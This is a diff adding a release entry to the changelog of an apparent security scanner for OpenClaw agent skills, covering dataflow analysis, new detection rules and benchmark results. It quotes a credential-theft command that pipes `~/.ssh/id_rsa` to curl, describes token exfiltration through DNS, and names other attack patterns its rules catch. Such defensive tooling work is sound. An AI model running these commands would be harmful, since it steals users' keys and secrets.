@@ -1,5 +1,80 @@
 # Changelog
 
+## 0.14.0
+
+Added dataflow analysis for bundled Python, JavaScript, TypeScript and shell
+scripts. Vendored tree-sitter grammars (versions and hashes in
+`packages/shared/grammars/README.md`) parse each script, and the analysis
+follows a value from where it is read to where it goes: a credential file or
+secret environment variable into a network send, a download or decoded string
+into execution, and writes into shell startup files, cron, launch agents and
+`authorized_keys`. A secret that reaches `requests.post` through a variable,
+which 0.13.2 missed, is now found. Each skill gets 250 ms. When the budget, a
+nesting limit or a size cap cuts the analysis short, the scan says so with
+"Dataflow analysis truncated" rather than reporting a clean result.
+
+Fixed bundled scripts being read as prose. Code-only patterns now apply to
+`scripts/run.sh` and other bundled files, not only to fenced blocks in
+`SKILL.md`. A shebang decides the language over the file extension.
+
+Added six critical rules: setuid bits, Windows account creation, crypto-miner
+pool configs, base64-encoded PowerShell, uploading `/etc/passwd` or
+`/etc/shadow`, and cloud metadata credential URLs. `python -c` and `node -e`
+on their own are now low notes; they are critical only when the inline program
+downloads, decodes or runs something.
+
+Fixed twelve rules that took quadratic time on a long line repeating one word,
+such as `curl curl curl ...`. Nine of them were already in 0.13.2. A 50 KB
+line could hold one rule for seconds, and the gate cannot cut a regex off
+mid-match, so a crafted skill could stall an install. Every rule is now
+tested against its own words repeated.
+
+Added `--semantic`, an LLM judge using your own key (`ANTHROPIC_API_KEY`, or
+`CLAWVET_LLM_*` for an OpenAI-compatible or local model). It runs alongside
+the static scan. In `gate`, any verdict other than benign is at least a warn,
+and an unavailable judge follows `--semantic-on-error` (warn by default).
+
+Added baselines. `scan --write-baseline <file> --reason <text>` records the
+current findings, and `--baseline <path>` accepts them on later runs. Each
+entry is bound to the hash of the file it was found in, and a finding with no
+file location can never be accepted.
+
+Added `--osv`, which looks up pinned dependencies on OSV.dev. It reads
+`package.json`, `package-lock.json`, `requirements.txt`, `Pipfile.lock`,
+`pyproject.toml` and `poetry.lock`, and is off by default because it uses
+the network. Both files can run code on install, so a `package.json` or
+`pyproject.toml` too large to inspect blocks.
+
+Updated the gate for OpenClaw 2026.11.2. A warn whose notice ran past 4,000
+characters was turned into a block by OpenClaw; the gate now fits the reason
+and findings into that budget. Findings carry the file they were found in and
+a line relative to that file. `--print-config` passes the judge's key
+variables through to the policy process, without which `--semantic` never saw
+them. `audit` and `watch` look in the current skill directories, including
+`<workspace>/.agents/skills`, `~/.agents/skills` and
+`$OPENCLAW_STATE_DIR/skills`. Downloads declared in a skill's install metadata
+are checked like any other install.
+
+Fixed visible credential theft being approved. `cat ~/.ssh/id_rsa | curl -X
+POST -d @- https://...` scored 24 and passed, and a skill sending
+`$NPM_TOKEN` out through `dig` scored 5. A credential read is downweighted
+unless the skill also sends data out, and only known exfiltration hosts
+counted as sending. Three shapes now count, in code only, to any host: a file
+or environment read piped into an upload, a request body substituted from a
+file or a secret-named variable, and a variable carried as a label in a DNS
+name. Found by evaluating 0.13.2 on SkillsBench-1650 and MaliciousSkillBench,
+so results for later versions on those two datasets are no longer held-out.
+
+On the MalSkillBench tune half, the gate now stops 63.1% of malicious skills
+(0.13.2: 57.4%) and 12.0% of benign ones (0.13.2: 11.6%). The test half was
+not measured.
+
+Added the scripts behind the gate evaluation: baseline verdicts from
+MalSkillBench's published outputs (`benchmarks/gate-eval/baselines.py`),
+paired comparison with cluster-bootstrap intervals (`compare.mjs`), preparers
+for SkillsBench-1650 and MaliciousSkillBench, and inert packing fixtures in
+`benchmarks/packing/`.
+
 ## 0.13.2
 
 Fixed `scan --format json` and `--format sarif` cutting their output off when
